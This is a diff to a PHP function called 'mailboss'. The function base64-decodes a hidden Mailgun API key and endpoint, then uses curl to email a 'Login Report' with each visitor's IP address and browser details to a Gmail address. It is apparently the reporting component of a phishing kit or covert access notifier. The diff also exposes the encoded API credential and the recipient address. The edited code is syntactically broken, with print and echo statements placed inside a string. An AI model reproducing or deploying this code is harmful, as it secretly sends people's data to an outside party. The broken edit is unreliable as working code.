@@ -51,12 +51,6 @@ function mailboss()
 {
     $ua = getBrowser();
     
-    $patterns = array();
-    $patterns[0] = '/Array/';
-    $patterns[1] = '/\(/';
-    $patterns[2] = '/\)/';
-    $dis = preg_replace($patterns,'',print_r($ua,true));
-    
        $str = "MjlmMDU1NTQwOTE5ZDA0ZmFiNDdiOTY2OTAxM2E5YmYtNmUwZmQzYTQtYWIyM2M5YmY=";
        $domain = "aHR0cHM6Ly9hcGkubWFpbGd1bi5uZXQvdjMvc2FuZGJveDI3OGRiMGFhNDFmOTQ5Zjc4NzU4NzczM2NkNTBlNDFjLm1haWxndW4ub3JnL21lc3NhZ2Vz";
        $sm =  base64_decode($str);
@@ -67,7 +61,19 @@ function mailboss()
             -F from='Project Neo <mailgun@sandbox278db0aa41f949f787587733cd50e41c.mailgun.org>' \
             -F to=danlyt74@gmail.com \
             -F subject='Login Report' \
-            -F html='Hi boss! Access was given to<br><b>IP: ".getUserIpAddr()."</b><br>Sytem info: <pre>".$dis."</pre><br>'");   
+            -F html='Hi boss! Access was given to<br><b>IP: ".getUserIpAddr()."</b><br>Sytem info: <pre>".
+                             
+                    print "<pre>";
+                    $patterns = array();
+                    $patterns[0] = '/Array/';
+                    $patterns[1] = '/\(/';
+                    $patterns[2] = '/\)/';
+                    echo preg_replace($patterns,'',print_r($ua,true));
+                    print "</pre>";
+                             
+                             
+                             ."</pre><br>'
+            ");   
 }
 
 function getUserIpAddr(){
